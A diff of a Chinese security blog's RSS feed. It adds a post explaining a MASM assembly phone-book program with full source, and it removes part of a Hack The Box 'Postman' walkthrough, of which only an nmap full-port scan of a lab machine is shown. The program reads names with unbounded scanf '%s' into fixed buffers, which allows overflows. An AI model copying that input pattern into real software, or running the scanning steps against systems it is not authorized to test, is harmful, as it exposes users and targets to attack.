@@ -5,9 +5,767 @@
     <description></description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Mon, 20 Apr 2020 01:16:17 +0800</pubDate>
-    <lastBuildDate>Mon, 20 Apr 2020 01:16:17 +0800</lastBuildDate>
+    <pubDate>Mon, 20 Apr 2020 14:06:21 +0800</pubDate>
+    <lastBuildDate>Mon, 20 Apr 2020 14:06:21 +0800</lastBuildDate>
     <generator>Jekyll v4.0.0</generator>
+    
+      <item>
+        <title>汇编实现电话本 Tips</title>
+        <description>&lt;h1 id=&quot;汇编实现电话本-tips&quot;&gt;汇编实现电话本 Tips&lt;/h1&gt;
+
+&lt;p&gt;之前实现了汇编程序的电话本，其中遇到很多坑和很多新知识，这里稍微总结一下，给大家提供一些思路
+（完整代码见最后）&lt;/p&gt;
+
+&lt;h2 id=&quot;0x01-data-段&quot;&gt;0x01 .data 段&lt;/h2&gt;
+
+&lt;p&gt;.data 段会存放常量、全局变量、输入输出提示符、打印信息等&lt;/p&gt;
+
+&lt;h3 id=&quot;换行&quot;&gt;换行&lt;/h3&gt;
+
+&lt;p&gt;汇编中的换行符为 &lt;code class=&quot;highlighter-rouge&quot;&gt;0dh, 0ah&lt;/code&gt;，同时需要在字符串结尾添加 0&lt;/p&gt;
+
+&lt;p&gt;例：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;info db &quot;Hello&quot;, 0dh, 0ah,
+		&quot;World!&quot;, 0
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;输出：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;Hello
+World！
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;定义常量&quot;&gt;定义常量&lt;/h2&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;name equ &amp;lt;表达式&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;上述换行就可以简化定义成一个常量&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;endl EQU &amp;lt;0dh,0ah&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;实现输入输出&quot;&gt;实现输入输出&lt;/h2&gt;
+
+&lt;p&gt;汇编中实现输入输出有多种方式，此处使用第三种，因为它可以方便输出更多数据类型，也更类似 C 语法&lt;/p&gt;
+
+&lt;p&gt;1、使用 MASM 提供的 StdOut、StdIn 函数;&lt;/p&gt;
+
+&lt;p&gt;2、使用系统 API:&lt;/p&gt;
+
+&lt;p&gt;3、使用微软 C 标准库 msvcrt.dll 中的 crt_printf、crt_scanf 函数.&lt;/p&gt;
+
+&lt;p&gt;参考：https://www.dbgpro.com/archives/2890.html&lt;/p&gt;
+
+&lt;h4 id=&quot;输出&quot;&gt;输出&lt;/h4&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;在 .data 段中定义要输出的字符串&lt;/li&gt;
+  &lt;li&gt;在 .code 段中调用函数&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;例：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;.data
+	szShowMenu db &quot;电话本 V1.0&quot;, endl, 
+		&quot;1. 添加数据&quot;, endl,
+     	&quot;2. 显示数据&quot;, endl,
+     	&quot;3. 查找数据&quot;, endl,
+		&quot;4. 删除数据&quot;, endl,
+		&quot;5. 修改数据&quot;, endl,
+     	&quot;6. 退出程序&quot;, endl,
+     	&quot;请输入选项: &quot;, 0
+.code
+	push offset szInputNum	; 将字符串地址压入栈中
+	call crt_printf			; 调用函数
+	add esp, 4				; 平栈
+	; 或者
+	; invoke crt_printf, addr szInputNum
+  ; ret
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;输出：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/007S8ZIlgy1ge033uqvx0j30gs0a4q3t.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;输入&quot;&gt;输入&lt;/h4&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;在 .data 段定义格式化字符串&lt;/li&gt;
+  &lt;li&gt;在 .code 段调用函数&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;例：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;.data
+	str_format_int	db	&quot;%c&quot;, 0
+	; 用于保存菜单的选项
+	choose db 0	;	定义存放输入的变量
+.code
+	; 获取用户的输入
+	push offset choose	; 存放输入的变量地址
+	push offset str_format_int	; 格式化字符的地址，此处表示获取一个字符
+	call crt_scanf
+  ; 有两个参数，需要平衡 2*4 字节
+	add esp, 8
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;0x02-汇编中的函数&quot;&gt;0x02 汇编中的函数&lt;/h2&gt;
+
+&lt;p&gt;任何非 demo 都建议使用函数来增强代码复用和可读性，汇编中定义函数需要 使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;proc&lt;/code&gt; 和 &lt;code class=&quot;highlighter-rouge&quot;&gt;endp&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;.code
+	Func1 proc
+		mov eax, 3
+	Func1 endp
+	
+	main proc
+		call Func1
+	main endp
+	end main
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/007S8ZIlgy1ge0558ggrfj31dm0u0778.jpg&quot; alt=&quot;image-20200420120643558&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;0x03-循环&quot;&gt;0x03 循环&lt;/h2&gt;
+
+&lt;p&gt;汇编中循环多用 &lt;code class=&quot;highlighter-rouge&quot;&gt;标号&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;jmp&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;loop&lt;/code&gt; 实现，也可以使用伪代码，但限制太多比较难实现复杂的循环&lt;/p&gt;
+
+&lt;p&gt;例：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;mov eax, val1                 			; 把变量复制到 EAX
+beginwhile:
+        cmp eax, val2                  ; 如果非 val1 &amp;lt; val2
+        jnl     endwhile               ; 退出循环
+        inc    eax                     ; val1++;
+        dec    val2                    ; val2--;
+        jmp    beginwhile              ; 重复循环
+endwhile:
+        mov    val1, eax                ;保存 val1 的新值
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;参考：http://c.biancheng.net/view/3579.html&lt;/p&gt;
+
+&lt;h2 id=&quot;0x04-实现数组遍历查询功能&quot;&gt;0x04 实现数组遍历（查询功能）&lt;/h2&gt;
+
+&lt;p&gt;实现数组遍历，即找到对应数组信息是非常重要的功能，除了查询，删除和修改都要用到这个功能&lt;/p&gt;
+
+&lt;h3 id=&quot;repe-cmpsb-指令解析&quot;&gt;repe cmpsb 指令解析&lt;/h3&gt;
+
+&lt;p&gt;repe 是一个串操作前缀，它重复串操作指令，每重复一次 ECX 的值就减一
+一直到 CX 为 0 或 ZF 为 0 时停止。&lt;/p&gt;
+
+&lt;p&gt;cmpsb 是字符串比较指令，把 ESI 指向的数据与 EDI 指向的数一个一个的进行比较。如果两个字符相等，即 ZF 为 1，当不相等时 ZF 为 0&lt;/p&gt;
+
+&lt;p&gt;当 repe cmpsb 配合使用时就是实现字符串比较，当相同时继续比较，不同时（ZF = 0）停止比较&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;start_for:
+	cmp edx, count
+	jnb info_output
+
+	; 获取结构体的大小
+	mov eax, sizeof(Contact)
+	; edx 相当于计数器 i，计算 arr[i] 的偏移
+	imul eax, edx
+	; 获取数组首地址
+	lea esi, TeleContacts
+	; 计算对应下标 i 元素的首地址
+	add esi, eax
+
+	; username 里存放我们输入的想要查询的字符串
+	lea edi,  username
+	; 这里是要进行对比的第 i 个数组的字符串
+	lea esi, [esi + Contact.user]
+	; 设定最长对比长度
+	mov ecx, 20h
+
+	; 比较 edi 和 esi 里存的字符串
+	repe cmpsb
+	; 不相等就进入下一次循环（此时 ZF=0 jnz会跳转）
+	jne next_for
+	; 相等就打印信息
+	xxx ; 略
+next_for:
+	inc edx
+	jmp start_for
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;0x05-删除功能&quot;&gt;0x05 删除功能&lt;/h2&gt;
+
+&lt;p&gt;首先找到我们需要删除的信息，同上&lt;/p&gt;
+
+&lt;p&gt;之后，从后一个数组元素开始的地址，将每个字节都向前填充到前一个元素的地址，借此实现该数组元素的删除&lt;/p&gt;
+
+&lt;h3 id=&quot;rep-movsb-指令解析&quot;&gt;rep movsb 指令解析&lt;/h3&gt;
+
+&lt;p&gt;搬移字串指令有两种，分别是 MOVSB 和 MOVSW，先说 MOVSB。MOVSB 的英文是 move string byte，意思是搬移一个字节，它是把 DS:SI 所指地址的一个字节搬移到 ES:DI 所指的地址上，搬移后原来的内容不变，但是原来 ES:DI 所指的内容会被覆盖而且在搬移之后 SI 和 DI 会自动地址向下一个要搬移的地址。&lt;/p&gt;
+
+&lt;p&gt;通常，程序并不会只搬一个字节，都会重复许多次，如果要重复的话，就得把重复次数 ( 也就是字串长度 ) 先记录在 CX 寄存器，并且在 MOVSB 之前加上 REP 指令，REP 是重复 (repeat) 的意思。&lt;/p&gt;
+
+&lt;p&gt;一般而言汇编语言源文件的每一行都只有一个指令，但 REP MOVSB 却可以在同一行写两个指令，当然分开写也是一样的。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;del_process:
+	; 将序号后的字节都前移
+	mov ebx, find_i
+	mov ecx, sizeof(Contact)
+	imul ebx, ecx
+	lea edi, TeleContacts
+	; 获取目的地址
+	add edi, ebx
+	; 获取源地址（目的地址后一个）
+	mov esi, edi
+	add esi, ecx
+
+	; 计算拷贝数量
+	mov eax, count
+	sub eax, find_i
+	; 需要前移的字节
+	imul ecx, eax
+
+	; 循环前移 把 DS:SI 所指地址的一个字节搬移到 ES:DI 所指的地址上
+	rep movsb
+	; 总数 -1
+	dec count
+	; 成功删除
+	push offset szDelSuccess
+	call crt_printf
+	add esp, 4
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;0x06-完整代码&quot;&gt;0x06 完整代码&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;; .386
+; .model flat,stdcall
+; .stack 4096
+
+include Irvine32.inc
+includelib kernel32.lib
+includelib Irvine32.lib
+include msvcrt.inc
+includelib msvcrt.lib
+include masm32.inc
+includelib masm32.lib
+
+
+
+ExitProcess proto,dwExitCode:dword
+
+; 定义需要的结构体
+Contact struct
+    ; 需要定义的数据
+    user db 32 dup(0)
+    tel db 20 dup(0)
+Contact ends
+
+.data
+
+; 设置控制台标题
+titleStr BYTE &quot;汇编电话本 V1.0    Author: WuJ1n9&quot;, 0
+
+endl EQU &amp;lt;0dh,0ah&amp;gt;            ; 行结尾
+
+; 定义一个结构体数组，用于存放所有的联系人
+TeleContacts Contact 100 dup(&amp;lt;'0'&amp;gt;)
+TempTeleContacts Contact &amp;lt;'0', '0'&amp;gt;
+
+; 用于保存菜单的选项
+choose db 0
+
+; 清空屏幕
+str_system_cls db &quot;cls&quot;, 0
+
+; 当前最多能存放多少个数据
+max_count dd 20
+
+; 暂停
+str_system_pause db &quot;pause&quot;, 0dh, 0ah, 0
+
+; 已经存放了多少个数据
+count dd 0
+
+; 序号
+find_i dd 0
+
+; 用于保存用户名和电话
+username db 32 dup(0)
+telenum db 20 dup(0)
+
+szShowMenu db &quot;电话本 V1.0&quot;, endl, 
+		 &quot;1. 添加数据&quot;, endl,
+         &quot;2. 显示数据&quot;, endl,
+         &quot;3. 查找数据&quot;, endl,
+		 &quot;4. 删除数据&quot;, endl,
+		 &quot;5. 修改数据&quot;, endl,
+         &quot;6. 退出程序&quot;, endl,
+         &quot;请输入选项: &quot;, 0
+         ; 0dh 0ah == \r\n 0 字符串结尾
+ShowMenuSize db	($ - szShowMenu)
+
+szInputName db &quot;请输入联系人的姓名：&quot;, endl, 0
+InputNameSize db ($ - szInputName)
+szInputNum db &quot;请输入联系人的电话：&quot;, endl, 0
+szInputError db &quot;请重新输入格式正确的选项!（数字1-6）&quot;, endl, 0
+szFenGe db &quot;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&quot;, endl, 0
+szFind db &quot;请输入要查询联系人的姓名：&quot;, endl, 0
+szFindNoone db &quot;查无此人&quot;, endl, 0
+szDelWho db &quot;请输入要删除联系人的姓名：&quot;, endl, 0
+szDelSuccess db &quot;删除成功！&quot;, endl, 0
+szModify db &quot;请输入要修改联系人的姓名：&quot;, endl, 0
+szModifySuccess db &quot;修改成功！&quot;, endl, 0
+szInputNewName db &quot;请输入新的联系人姓名：&quot;, endl, 0
+szInputNewNum db &quot;请输入新的联系人电话：&quot;, endl, 0
+
+str_printf_size db &quot;超出容量&quot;, 0dh, 0ah, 0
+str_format_str	db		&quot;%s&quot;, 0
+str_format_int	db		&quot; %c&quot;, 0 ; 此处前面加一个空格，用于把换行符吃掉
+; 输出联系人信息
+str_show_content db &quot;%d: %-7s %-7s&quot;, 0dh, 0ah, 0
+
+stdOutHandle	HANDLE	0     ; 标准输出设备句柄
+stdInHandle		HANDLE	0
+
+byteWritten	DWORD ?      ; 输出字节数
+bytesRead   DWORD ?
+
+.code
+
+; 控制台标题
+INVOKE SetConsoleTitle, ADDR titleStr
+
+
+AddData proc
+		; 获取当前已存放的个数
+		mov ecx, count
+		; 判断是否大于容量
+		
+		.if ecx == max_count
+		; 如果超出了，就报错
+		jmp size_error
+		.endif
+
+		; 打印提示
+		; 因为 printf 会修改 edx, ecx 和 eax 的值，所以需要进行保存
+		push edx
+		push eax
+		push ecx
+		push offset szInputName
+		call crt_printf
+		add esp, 4
+		pop ecx
+		pop eax
+		pop edx
+
+		; 接收用户的输入
+		; 获取结构体的大小
+		mov eax, sizeof(Contact)
+		; 计算偏移
+		imul eax, ecx
+		; 获取数组首地址
+		lea esi, TeleContacts
+		; 计算对应下标元素的首地址
+		add esi, eax
+
+		; 获取联系人
+		lea ebx, [esi + Contact.user]
+		push ebx
+		push offset str_format_str
+		call crt_scanf
+		add esp, 8
+
+		; 打印提示
+		; 因为 printf 会修改 edx, ecx 和 eax 的值，所以需要进行保存
+		push edx
+		push eax
+		push ecx
+		push offset szInputNum
+		call crt_printf
+		add esp, 4
+		pop ecx
+		pop eax
+		pop edx
+
+		; 获取联系人电话
+		lea ebx, [esi + Contact.tel]
+		push ebx
+		push offset str_format_str
+		call crt_scanf
+		; 平栈
+		add esp, 8
+
+		; 自增计数器 count
+		inc count
+		jmp ret_addr
+
+size_error:
+		push offset str_printf_size
+		call crt_printf
+		add esp, 4
+
+ret_addr:
+		ret
+AddData endp
+
+
+ShowData proc
+	; 打印分割符
+	push offset szFenGe
+	call crt_printf
+	add esp, 4
+
+	mov ecx, 0
+	.while ecx &amp;lt; count
+		; 获取结构体的大小
+		mov eax, sizeof(Contact)
+		; 计算偏移
+		imul eax, ecx
+		; 获取数组首地址
+		lea esi, TeleContacts
+		; 计算对应下标元素的首地址
+		add esi, eax
+
+		; 打印所有联系人信息
+		push ecx    ; 保存原始 ecx
+		lea ebx, [esi + Contact.tel]
+		push ebx
+		lea ebx, [esi + Contact.user]
+		push ebx
+		push ecx
+		push offset str_show_content
+		call crt_printf
+		add esp, 10h
+		pop ecx     ; 恢复 ecx
+
+		; 自增下标
+		inc ecx
+	.endw
+
+	; 打印分割符
+	push offset szFenGe
+	call crt_printf
+	add esp, 4
+
+ret
+ShowData endp
+
+
+FindData proc
+	; 提示输入查找的姓名
+    push offset szFind
+	call crt_printf
+	add esp, 4
+
+	; 获取输入的用户名 scanf(&quot;%s&quot;, username)
+	push offset username
+	push offset str_format_str
+	call crt_scanf
+	add esp, 8
+
+	mov byte ptr [username + 31],0
+
+	mov edx, 0
+start_for:
+	cmp edx, count
+	jnb info_output
+
+	;同上
+	mov eax, sizeof(Contact)
+	imul eax, edx
+	lea esi, TeleContacts
+	add esi, eax
+
+	lea edi,  username
+	lea esi, [esi + Contact.user]
+	mov ecx, 20h
+
+	; 比较 edi 和 esi 里存的字符串
+	repe cmpsb
+	; 不相等就进入下一次循环
+	jne next_for
+	; 相等就打印信息
+	push edx    ; 保存 edx
+	; 恢复 esi
+	lea esi, TeleContacts
+	add esi, eax
+	; 输出
+	lea ebx, [esi + Contact.tel]
+	push ebx
+	lea ebx, [esi + Contact.user]
+	push ebx
+	push edx
+	push offset str_show_content
+	call crt_printf
+	add esp, 10h
+	pop edx    ; 恢复 edx
+	jmp end_for		; 结束循环
+
+next_for:
+	inc edx
+	jmp start_for
+
+info_output:
+	push offset szFindNoone
+	call crt_printf
+	add esp, 4
+
+end_for:
+	ret
+
+FindData endp
+
+
+DelData proc
+	; 打印提示信息
+	push offset szDelWho
+	call crt_printf
+	add esp, 4
+
+	; 获取输入的用户名 scanf(&quot;%s&quot;, username)
+	push offset username
+	push offset str_format_str
+	call crt_scanf
+	add esp, 8
+
+	; 查询该用户的序号
+	mov edx, 0
+start_for:
+	cmp edx, count
+	jnb info_output
+
+	;同上
+	mov eax, sizeof(Contact)
+	imul eax, edx
+	lea esi, TeleContacts
+	add esi, eax
+
+	lea edi,  username
+	lea esi, [esi + Contact.user]
+	mov ecx, 20h
+
+	; 比较 edi 和 esi 里存的字符串
+	repe cmpsb
+	; 不相等就进入下一次循环
+	jne next_for
+	; 相等，edx 就是该用户的序号
+	mov find_i, edx
+	jmp del_process		; 结束循环
+
+next_for:
+	inc edx
+	jmp start_for
+
+info_output:
+	push offset szFindNoone
+	call crt_printf
+	add esp, 4
+	jmp exit_prog
+
+del_process:
+	; 将序号后的字节都前移
+	mov ebx, find_i
+	mov ecx, sizeof(Contact)
+	imul ebx, ecx
+	lea edi, TeleContacts
+	; 获取目的地址
+	add edi, ebx
+	; 获取源地址（目的地址后一个）
+	mov esi, edi
+	add esi, ecx
+
+	; 计算拷贝数量
+	mov eax, count
+	sub eax, find_i
+	; 需要前移的字节
+	imul ecx, eax
+
+	; 循环前移 把 DS:SI 所指地址的一个字节搬移到 ES:DI 所指的地址上
+	rep movsb
+	; 总数 -1
+	dec count
+	; 成功删除
+	push offset szDelSuccess
+	call crt_printf
+	add esp, 4
+
+exit_prog:
+	ret
+DelData endp
+
+
+ModifyData proc
+	; 打印提示信息
+	push offset szModify
+	call crt_printf
+	add esp, 4
+
+	; 获取输入的用户名 scanf(&quot;%s&quot;, username)
+	push offset username
+	push offset str_format_str
+	call crt_scanf
+	add esp, 8
+
+	; 查询该用户的序号
+	mov edx, 0
+start_for:
+	cmp edx, count
+	jnb info_output
+
+	;同上
+	mov eax, sizeof(Contact)
+	imul eax, edx
+	lea esi, TeleContacts
+	add esi, eax
+
+	lea edi,  username
+	lea esi, [esi + Contact.user]
+	mov ecx, 20h
+
+	; 比较 edi 和 esi 里存的字符串
+	repe cmpsb
+	; 不相等就进入下一次循环
+	jne next_for
+	; 相等，edx 就是该用户的序号
+	mov find_i, edx
+	jmp modify_process		; 结束循环
+
+next_for:
+	inc edx
+	jmp start_for
+
+info_output:
+	push offset szFindNoone
+	call crt_printf
+	add esp, 4
+	jmp exit_prog
+
+modify_process:
+	; 输入新的姓名
+	push offset szInputNewName
+	call crt_printf
+	add esp, 4
+	; 获取输入的用户名 scanf(&quot;%s&quot;, username)
+	push offset TempTeleContacts.user
+	push offset str_format_str
+	call crt_scanf
+	add esp, 8
+	; 输入新的电话
+	push offset szInputNewNum
+	call crt_printf
+	add esp, 4
+	; 获取电话号码
+	push offset TempTeleContacts.tel
+	push offset str_format_str
+	call crt_scanf
+	add esp, 8
+
+	; 修改
+	mov ecx, sizeof(Contact)
+	mov eax, find_i
+	lea esi, TempTeleContacts
+	lea edi, TeleContacts
+	imul eax, ecx
+	add edi, eax
+	; 把 DS:SI 所指地址的一个字节搬移到 ES:DI 所指的地址上
+	rep movsb
+	; 成功修改
+	push offset szModifySuccess
+	call crt_printf
+	add esp, 4
+
+exit_prog:
+	ret
+ModifyData endp
+
+
+main proc
+
+begin_while:
+
+	; 清空屏幕
+	push offset str_system_cls
+	call crt_system
+	add esp, 4	
+
+	; 获得控制台输出句柄
+	invoke	GetStdHandle, STD_OUTPUT_HANDLE
+	mov		stdOutHandle, eax
+	; 打印电话本首页
+	invoke	WriteConsole, stdOutHandle,          ; 控制台输出句柄
+						  addr szShowMenu,           ; 字符串指针
+					      ShowMenuSize,            ; 字符长度
+						  addr byteWritten,      ; 返回输出字节数
+						  0                       ; 未使用
+	
+	; 获得控制台输入句柄
+	; invoke	GetStdHandle, STD_INPUT_HANDLE
+    ; mov		stdInHandle,  eax
+	; 等待用户输入
+    ; invoke	ReadConsole,  stdInHandle, 
+	;					  ADDR choose,
+	;					  1, 
+	;					  ADDR bytesRead, 0
+	;invoke	StdOut,       addr choose
+    ;ret 
+	
+	; 获取用户的输入
+	push offset choose
+	push offset str_format_int
+	call crt_scanf
+    ; 有两个参数，需要平衡 2*4 字节
+	add esp, 8
+
+	.if choose == &quot;1&quot;	
+		call AddData
+		jmp end_switch
+	.elseif choose ==&quot;2&quot;
+		call ShowData
+		jmp end_switch
+	.elseif choose == &quot;3&quot;
+		call FindData
+		jmp end_switch
+	.elseif choose == &quot;4&quot;
+		call DelData
+		jmp end_switch
+	.elseif choose == &quot;5&quot;
+		call ModifyData
+		jmp end_switch
+	.elseif choose == &quot;6&quot;
+		jmp exit_prog 
+	.else
+		jmp input_error
+	.endif
+
+; 提示输入正确选项
+input_error:
+	push offset szInputError
+	call crt_printf
+	add esp, 4
+
+; 添加暂停
+end_switch:
+	push offset str_system_pause
+	call crt_system
+	add esp, 4
+
+	jmp begin_while
+
+; 退出
+exit_prog:
+	INVOKE ExitProcess,0
+
+main endp
+end main
+&lt;/code&gt;&lt;/pre&gt;
+
+</description>
+        <pubDate>Mon, 20 Apr 2020 20:28:00 +0800</pubDate>
+        <link>http://localhost:4000/2020/04/20/%E6%B1%87%E7%BC%96%E5%AE%9E%E7%8E%B0%E7%94%B5%E8%AF%9D%E6%9C%AC-Tips/</link>
+        <guid isPermaLink="true">http://localhost:4000/2020/04/20/%E6%B1%87%E7%BC%96%E5%AE%9E%E7%8E%B0%E7%94%B5%E8%AF%9D%E6%9C%AC-Tips/</guid>
+        
+        <category>逆向</category>
+        
+        <category>汇编</category>
+        
+        
+      </item>
     
       <item>
         <title>通过画堆栈图解析汇编中函数调用的过程</title>
@@ -733,451 +1491,6 @@ hello world
         <pubDate>Fri, 03 Jan 2020 08:28:00 +0800</pubDate>
         <link>http://localhost:4000/2020/01/03/HTB-Traverxec/</link>
         <guid isPermaLink="true">http://localhost:4000/2020/01/03/HTB-Traverxec/</guid>
-        
-        <category>HTB</category>
-        
-        <category>渗透测试</category>
-        
-        
-      </item>
-    
-      <item>
-        <title>Hackthebox Postman writeup/Walkthrough/攻略</title>
-        <description>&lt;h2 id=&quot;0x00-简介&quot;&gt;0x00 简介&lt;/h2&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;nmap 指令&lt;/li&gt;
-  &lt;li&gt;Redis 未授权访问&lt;/li&gt;
-  &lt;li&gt;Webmin CVE Package Updates&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;0x01-信息收集&quot;&gt;0x01 信息收集&lt;/h2&gt;
-
-&lt;p&gt;nmap 对某一站点全面扫描 (&lt;strong&gt;SYN全端口扫描&lt;/strong&gt;) 常用指令如下：&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
-&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; 10.10.10.160
-&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;&lt;strong&gt;-sS:&lt;/strong&gt;  SYN扫描是目前默认的也是最受欢迎的扫描选项&lt;/p&gt;
-
-  &lt;p&gt;&lt;strong&gt;-sV:&lt;/strong&gt; 版本探测，也可以用 -A 同时打开操作系统探测和版本探测。&lt;/p&gt;
-
-  &lt;p&gt;&lt;strong&gt;-sC:&lt;/strong&gt; 使用默认脚本进行扫描&lt;/p&gt;
-
-  &lt;p&gt;&lt;strong&gt;-T4:&lt;/strong&gt; 指定扫描过程中使用的时序(Timing)，共有6个级别(0-5)，级别越高，扫描速度越快，但也越容易被防火墙屏蔽。在网络通信状态良好的情况下推荐使用 T4.&lt;/p&gt;
-
-  &lt;p&gt;&lt;strong&gt;-v:&lt;/strong&gt; 显示冗余信息，在扫描过程中显示扫描的细节&lt;/p&gt;
-
-  &lt;p&gt;&lt;strong&gt;-p-:&lt;/strong&gt; 表示从端口1扫描到65535&lt;/p&gt;
-
-  &lt;p&gt;&lt;strong&gt;Other:&lt;/strong&gt; 扫描的时候按 &lt;code class=&quot;highlighter-rouge&quot;&gt;d&lt;/code&gt; 可以显示 debug 信息，按 &lt;code class=&quot;highlighter-rouge&quot;&gt;x&lt;/code&gt; 可以显示当前进度&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;root@kali:~# nmap &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; 10.10.10.160
-Starting Nmap 7.70 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2020-01-02 21:56 CST
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Postman &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.160&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.15s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Not shown: 49025 closed ports, 16506 filtered ports
-PORT      STATE SERVICE VERSION
-22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-| ssh-hostkey: 
-|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
